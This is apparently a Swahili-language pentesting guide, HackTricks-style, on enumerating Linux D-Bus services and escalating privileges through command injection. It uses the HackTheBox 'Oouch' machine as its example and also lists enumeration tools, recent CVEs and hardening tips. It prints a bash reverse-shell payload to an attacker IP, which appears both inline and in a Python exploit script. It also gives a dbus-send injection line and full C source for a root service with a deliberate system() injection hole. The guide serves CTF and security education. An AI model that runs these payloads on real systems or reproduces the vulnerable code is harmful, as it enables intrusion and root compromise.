# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus hutumika kama kiunganishi cha mawasiliano kati ya michakato (IPC) katika mazingira ya desktop ya Ubuntu. Katika Ubuntu, kuna message bus kadhaa zinazofanya kazi kwa wakati mmoja: system bus, inayotumiwa hasa na **services zenye upendeleo wa juu ili kutoa services zinazohusika na mfumo mzima**, na session bus ya kila mtumiaji aliyeingia, inayotoa services zinazomhusu mtumiaji huyo pekee. Hapa tunazingatia zaidi system bus kwa sababu inahusishwa na services zinazoendeshwa zikiwa na upendeleo wa juu (kwa mfano, root), kwani lengo letu ni kuongeza upendeleo. Usanifu wa D-Bus hutumia 'router' kwa kila session bus, ambayo huelekeza upya ujumbe wa wateja kwenda kwa services zinazofaa kulingana na anwani ambayo wateja wamebainisha kwa service wanayotaka kuwasiliana nayo.<sup>[[1]](#references)</sup>

Services kwenye D-Bus hufafanuliwa na **objects** na **interfaces** zinazotoa. Objects zinaweza kufananishwa na mifano ya class katika lugha za kawaida za OOP, ambapo kila mfano hutambuliwa kipekee kwa kutumia **object path**. Njia hii, inayofanana na njia ya mfumo wa faili, hutambua kipekee kila object inayotolewa na service. Interface muhimu kwa ajili ya utafiti ni **org.freedesktop.DBus.Introspectable**, yenye method moja tu, Introspect. Method hii hurejesha uwakilishi wa XML wa methods, signals na properties zinazoungwa mkono na object. Hapa tunazingatia methods na kuacha properties na signals.

Kwa mawasiliano na interface ya D-Bus, zilitumika zana mbili: zana ya CLI inayoitwa **gdbus**, kwa ajili ya kuita kwa urahisi methods zinazotolewa na D-Bus ndani ya scripts, na [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), zana ya GUI inayotumia Python iliyoundwa kuorodhesha services zinazopatikana kwenye kila bus na kuonyesha objects zilizomo ndani ya kila service.

```bash
sudo apt-get install d-feet
```

Ikiwa unakagua **session bus**, thibitisha anwani ya sasa kwanza:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Katika picha ya kwanza, services zilizosajiliwa kwenye D-Bus system bus zinaonyeshwa, huku **org.debin.apt** ikiwa imeangaziwa baada ya kuchagua kitufe cha System Bus. D-Feet huuliza service hii kuhusu objects, kisha huonyesha interfaces, methods, properties na signals za objects zilizochaguliwa, kama inavyoonekana kwenye picha ya pili. Signature ya kila method pia imeelezwa kwa kina.

Kipengele muhimu ni kuonyesha **process ID (pid)** na **command line** ya service, jambo linalofaa kuthibitisha ikiwa service inaendeshwa kwa elevated privileges, na muhimu kwa utafiti.

**D-Feet pia huruhusu kuita methods**: watumiaji wanaweza kuingiza Python expressions kama parameters, ambazo D-Feet hubadilisha kuwa aina za D-Bus kabla ya kuziwasilisha kwa service.

Hata hivyo, kumbuka kuwa **baadhi ya methods zinahitaji authentication** kabla hazituruhusu kuziita. Tutazipuuza, kwa kuwa lengo letu ni kuongeza privileges zetu bila credentials.

Pia kumbuka kuwa baadhi ya services huuliza service nyingine ya D-Bus inayoitwa org.freedeskto.PolicyKit1 ikiwa mtumiaji anapaswa kuruhusiwa kutekeleza vitendo fulani au la.

## **Uchunguzi wa Cmd line**

### Orodhesha Service Objects

Inawezekana kuorodhesha D-Bus interfaces zilizofunguliwa kwa kutumia:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

Huduma zilizowekwa alama ya **`(activatable)`** zinavutia hasa kwa sababu **bado hazifanyi kazi**, lakini ombi la bus linaweza kuzianzisha linapohitajika. Usiishie kwenye `busctl list`; linganisha majina hayo na faili za binary ambazo zingetekelezwa.

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

Hilo hukuambia haraka ni njia gani ya `Exec=` itakayoanzishwa kwa jina linaloweza kuwashwa na chini ya utambulisho upi. Ikiwa binary au mnyororo wake wa utekelezaji haulindwi vya kutosha, huduma isiyofanya kazi bado inaweza kuwa njia ya kuongeza mamlaka.

Kwa huduma yenye mamlaka ya kupiga picha za USB, linganisha jina lake la system-bus na sera **halisi** ya kitendo chake cha kuandika picha. Sheria ya zamani ya vendor inaweza kumpa kundi la kiutawala la Unix `ResultActive=yes` bila kuuliza nenosiri; thibitisha kuwa akaunti ya sasa ni mwanachama wa kundi hilo, kipindi cha mtumiaji kiko hai, sheria hiyo imepakiwa na haijabatilishwa, na helper iliyosakinishwa bado inakubali njia za chanzo na lengwa zilizochaguliwa na mtumiaji. Maelezo ya huduma au toleo la zamani la kifurushi pekee hayathibitishi ufikiaji wa faili zozote. Kukosekana kwa activation descriptor pia hakuthibitishi kuwa huduma haifanyi kazi tayari. Kagua faili zisizobadilika za sera na huduma bila kuita mbinu ya kuandika picha; tazama [uchambuzi wa awali wa huduma](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).

#### Miunganisho

[Kutoka Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Mchakato unapoanzisha muunganisho kwa bus, bus huupa muunganisho huo jina maalum la bus linaloitwa _unique connection name_. Majina ya bus ya aina hii hayawezi kubadilishwa—imehakikishwa kuwa hayatabadilika mradi muunganisho huo upo—na, muhimu zaidi, hayawezi kutumiwa tena wakati bus hiyo ipo. Hii inamaanisha kuwa hakuna muunganisho mwingine kwa bus hiyo utakaowahi kupewa jina hilo la kipekee la muunganisho, hata kama mchakato huohuo utafungwa muunganisho wake na bus kisha kuunda mpya. Majina ya kipekee ya muunganisho hutambulika kwa urahisi kwa sababu huanza na herufi ya koloni, ambayo kwa kawaida hairuhusiwi.<sup>[[4]](#references)</sup>

### Maelezo ya Kitu cha Huduma

Kisha, unaweza kupata maelezo kuhusu interface kwa kutumia:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

Pia linganisha jina la bus na systemd unit yake pamoja na njia ya executable:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

Hili linajibu swali la kiutendaji muhimu wakati wa privesc: **ikiwa method call itafaulu, ni binary na unit gani halisi zitakazotekeleza kitendo hicho?**

### Orodhesha Interfaces za Service Object

Unahitaji kuwa na ruhusa za kutosha.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Chunguza Interface ya Service Object

Kumbuka kuwa katika mfano huu interface ya hivi karibuni iliyogunduliwa ilichaguliwa kwa kutumia parameter ya `tree` (_tazama sehemu iliyotangulia_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

Kumbuka method `.Block` ya interface `htb.oouch.Block` (ile tunayoivutia). Herufi "s" katika safu nyingine huenda ikamaanisha kuwa inatarajia string.

Kabla ya kujaribu kitu chochote hatari, thibitisha kwanza method ya **read-oriented** au yenye hatari ndogo kwa njia nyingine. Hii hutenganisha hali tatu waziwazi: sintaksia isiyo sahihi, method inayofikika lakini imekataliwa, au method inayofikika na kuruhusiwa.

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### Linganisha Mbinu za D-Bus na Sera na Vitendo

Introspection hukuambia **unachoweza** kuita, lakini hakukuambii **kwa nini** simu inaruhusiwa au inakataliwa. Kwa triage halisi ya privesc, kwa kawaida unahitaji kukagua **tabaka tatu kwa pamoja**:

1. **Metadata ya Activation** (faili za `.service` au `SystemdService=`) ili kujua ni binary na unit gani zitakazoendeshwa.
2. **Sera ya XML ya D-Bus** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) ili kujua ni nani anayeweza `own`, `send_destination`, au `receive_sender`.
3. **Faili za vitendo vya Polkit** (`/usr/share/polkit-1/actions/*.policy`) ili kujua modeli ya uidhinishaji chaguomsingi (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Amri muhimu:

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

Usidhani kuwa kuna ulinganifu wa 1:1 kati ya method ya D-Bus na action ya Polkit. Method ileile inaweza kuchagua action tofauti kulingana na object inayorekebishwa au muktadha wa wakati wa utekelezaji. Kwa hiyo, mtiririko wa kazi unaofaa ni:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` na utafute kwenye faili husika za `.policy`
3. Majaribio ya moja kwa moja yenye hatari ndogo kwa kutumia `busctl call`, `gdbus call`, au `dbusmap --enable-probes --null-agent`

Huduma za proxy au za uoanifu zinahitaji uangalifu zaidi. **Proxy inayoendeshwa na root** na kusambaza maombi kwa huduma nyingine ya D-Bus kupitia muunganisho wake ilioanzisha awali inaweza kusababisha backend kuchukulia kila ombi kuwa limetoka kwa UID 0, isipothibitishwa upya utambulisho wa caller wa awali.<sup>[[3]](#references)</sup>

### Kiolesura cha Kufuatilia/Kunasa

Ukiwa na ruhusa za kutosha (ruhusa za `send_destination` na `receive_sender` pekee hazitoshi) unaweza **kufuatilia mawasiliano ya D-Bus**.

Ili **kufuatilia** **mawasiliano**, utahitaji kuwa **root**. Ikiwa bado unakumbana na matatizo ukiwa root, angalia [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) na [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Ikiwa unajua jinsi ya kusanidi faili ya usanidi ya D-Bus ili **kuruhusu watumiaji wasio root kunasa** mawasiliano, tafadhali **wasiliana nami**!

Njia tofauti za kufuatilia:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

Katika mfano ufuatao, interface `htb.oouch.Block` inafuatiliwa na **ujumbe "**_**lalalalal**_**" hutumwa kupitia mawasiliano yasiyo sahihi**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Unaweza kutumia `capture` badala ya `monitor` ili kuhifadhi matokeo kwenye faili ya **pcapng** ambayo Wireshark inaweza kufungua:

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### Kuchuja kelele zote <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ikiwa kuna taarifa nyingi sana kwenye bus, pitisha match rule kama ifuatavyo:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

Sheria nyingi zinaweza kubainishwa. Ikiwa ujumbe unalingana na _sheria yoyote_, ujumbe huo utaonyeshwa. Kama hivi:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

Tazama [nyaraka za D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) kwa maelezo zaidi kuhusu sintaksia ya kanuni za ulinganifu.<sup>[[7]](#references)</sup>

### Zaidi

`busctl` ina chaguo zaidi, [**yapate yote hapa**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Hali Hatarishi**

Ukiwa mtumiaji **qtc ndani ya host "oouch" kutoka HTB**, unaweza kupata **faili ya usanidi ya D-Bus isiyotarajiwa** iliyo katika _/etc/dbus-1/system.d/htb.oouch.Block.conf_:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

Kumbuka kutoka kwenye usanidi uliopita kwamba **utahitaji kuwa mtumiaji `root` au `www-data` ili kutuma na kupokea taarifa** kupitia mawasiliano haya ya D-BUS.

Ukiwa mtumiaji **qtc** ndani ya docker container **aeb4525789d8**, unaweza kupata baadhi ya msimbo unaohusiana na dbus kwenye faili _/code/oouch/routes.py._ Huu ndio msimbo unaovutia:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

Kama unavyoona, **inaunganishwa na D-Bus interface** na kutuma "client_ip" kwa function ya **"Block"**.

Upande mwingine wa muunganisho wa D-Bus kuna binary iliyokusanywa ya C inayofanya kazi. Code hii **inasikiliza** muunganisho wa D-Bus **ikingoja anwani ya IP, kisha inaita iptables kupitia function ya `system`** ili kuzuia anwani ya IP iliyotolewa.\
**Wito wa `system` una uwezekano wa command injection kwa makusudi**, kwa hivyo payload kama ifuatayo itafungua reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Mwishoni mwa ukurasa huu unaweza kupata **code kamili ya C ya application ya D-Bus**. Ndani yake unaweza kuona kwenye mistari ya 91-97 **jinsi `D-Bus object path`** **na `interface name`** zinavyosajiliwa. Taarifa hii itahitajika ili kutuma taarifa kwenye muunganisho wa D-Bus:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Pia, katika mstari wa 57 unaweza kuona kwamba **mbinu pekee iliyosajiliwa** kwa mawasiliano haya ya D-Bus inaitwa `Block`(_**Ndiyo maana katika sehemu inayofuata payload zitatumwa kwa service object `htb.oouch.Block`, interface `/htb/oouch/Block` na jina la method `Block`**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

Msimbo ufuatao wa Python utatuma payload kwenye muunganisho wa D-Bus kupitia method ya `Block` kwa kutumia `block_iface.Block(runme)` (_kumbuka kuwa ulitolewa kutoka kwenye sehemu ya awali ya msimbo_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl na dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` ni zana inayotumika kutuma ujumbe kwa “Message Bus”
- Message Bus – Programu inayotumiwa na mifumo kurahisisha mawasiliano kati ya programu. Inahusiana na Message Queue (ujumbe hupangwa kwa mfuatano), lakini katika Message Bus ujumbe hutumwa kwa modeli ya usajili na pia kwa kasi sana.
- Tag ya “-system” hutumika kuashiria kuwa ni ujumbe wa mfumo, si ujumbe wa kipindi (kwa chaguo-msingi).
- Tag ya “–print-reply” hutumika kuchapisha ujumbe wetu ipasavyo na kupokea majibu yoyote katika muundo unaosomeka na binadamu.
- “–dest=Dbus-Interface-Block” Anwani ya kiolesura cha Dbus.
- “–string:” – Aina ya ujumbe tunaotaka kutuma kwenye kiolesura. Kuna miundo kadhaa ya kutuma ujumbe, kama vile double, bytes, booleans, int, objpath. Kati ya hii, “object path” ni muhimu tunapotaka kutuma njia ya faili kwenye kiolesura cha Dbus. Katika hali hii, tunaweza kutumia faili maalum (FIFO) kupitisha command kwenye kiolesura kwa kutumia jina la faili. “string:;” – Hii ni kuita object path tena, mahali tunapoweka faili/command ya FIFO reverse shell.

_Kumbuka kuwa katika `htb.oouch.Block.Block`, sehemu ya kwanza (`htb.oouch.Block`) inarejelea service object na sehemu ya mwisho (`.Block`) inarejelea jina la method._

### C code

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## Zana za Kiotomatiki za Enumeration (2023-2025)

Kufanya enumeration ya D-Bus attack surface kubwa kwa mikono kwa kutumia `busctl`/`gdbus` huwa kugumu haraka. Zana mbili ndogo za FOSS zilizotolewa katika miaka michache iliyopita zinaweza kuharakisha kazi wakati wa shughuli za red-team au CTF:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Imeandikwa kwa C; ni binary moja tuli (<50 kB) inayopitia kila object path, kupata XML ya `Introspect` na kuilinganisha na PID/UID inayomiliki.<sup>[[5]](#references)</sup>
* Bendera muhimu:
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* Tool huweka alama `!` kwenye majina well-known yasiyolindwa, na kufichua papo hapo huduma unazoweza *own* (kudhibiti) au method calls zinazoweza kufikiwa kutoka kwenye shell isiyo na ruhusa za juu.

### uptux.py
* Mwandishi: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Script ya Python pekee inayotafuta paths *zinazoweza kuandikwa* katika systemd units **na** faili za sera za D-Bus zenye ruhusa nyingi kupita kiasi (kwa mfano, `send_destination="*"`).<sup>[[6]](#references)</sup>
* Matumizi ya haraka:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* Moduli ya D-Bus hutafuta kwenye saraka zilizo hapa chini na kuangazia huduma zozote ambazo mtumiaji wa kawaida anaweza kuzifanya spoof au hijack:
  * `/etc/dbus-1/system.d/` na `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (mabadiliko ya vendor)

---

## Hitilafu Muhimu za D-Bus za Kupandisha Haki za Mtumiaji (2024-2025)

Kufuatilia CVE zilizochapishwa hivi karibuni husaidia kutambua mifumo isiyo salama inayofanana kwenye msimbo maalum. Mifano miwili mizuri ya hivi karibuni ni:<sup>[[2]](#references)[[3]](#references)</sup>

| Mwaka | CVE | Kipengele | Chanzo cha Tatizo | Funzo la Mashambulizi |
|------|-----|-----------|-------------------|------------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Huduma inayoendeshwa na root ilifichua kiolesura cha D-Bus ambacho watumiaji wasio na haki za juu wangeweza kukisanidi upya, ikiwemo kupakia tabia za macro zinazodhibitiwa na mshambuliaji. | Ikiwa daemon inatoa **usimamizi wa kifaa/profile/config** kwenye system bus, chukulia mipangilio inayoweza kuandikwa na vipengele vya macro kama njia za kutekeleza msimbo, si "mipangilio" tu. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Proxy ya uoanifu inayoendeshwa na root ilipeleka maombi kwa huduma za backend bila kuhifadhi muktadha wa usalama wa mpigaji wa awali, hivyo backend ziliamini proxy kama UID 0. | Chukulia huduma za D-Bus za **proxy / bridge / uoanifu** kama kundi tofauti la hitilafu: zikipeleka simu zenye haki za juu, hakikisha jinsi muktadha wa UID/Polkit wa mpigaji unavyofika kwenye backend. |

Mifumo ya kuzingatia:
1. Huduma inaendeshwa **kama root kwenye system bus**.
2. Huenda **hakuna ukaguzi wa idhini**, au ukaguzi hufanywa dhidi ya **subject isiyo sahihi**.
3. Mbinu inayoweza kufikiwa hatimaye hubadilisha hali ya mfumo: kusakinisha vifurushi, kubadilisha watumiaji/makundi, kusanidi bootloader, kusasisha wasifu wa kifaa, kuandika faili, au kutekeleza amri moja kwa moja.

Tumia `dbusmap --enable-probes` au `busctl call` kwa mkono ili kuthibitisha kama mbinu inaweza kufikiwa, kisha kagua XML ya sera ya huduma na vitendo vya Polkit ili kuelewa **ni subject gani hasa inayoidhinishwa**.

---

## Maboresho ya Haraka ya Usalama na Utambuzi

* Tafuta sera za world-writable au zilizo wazi kwa *send/receive*:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* Require Polkit kwa methods hatari – hata *root* proxies zinapaswa kupitisha PID ya *caller* kwa `polkit_authority_check_authorization_sync()` badala ya kutumia PID zao.
* Ondoa privileges katika helpers zinazoendeshwa kwa muda mrefu (tumia `sd_pid_get_owner_uid()` kubadilisha namespaces baada ya kuunganishwa kwenye bus).
* Ikiwa huwezi kuondoa service, angalau iweke kwenye Unix group maalum na uzuie ufikiaji katika policy yake ya XML.
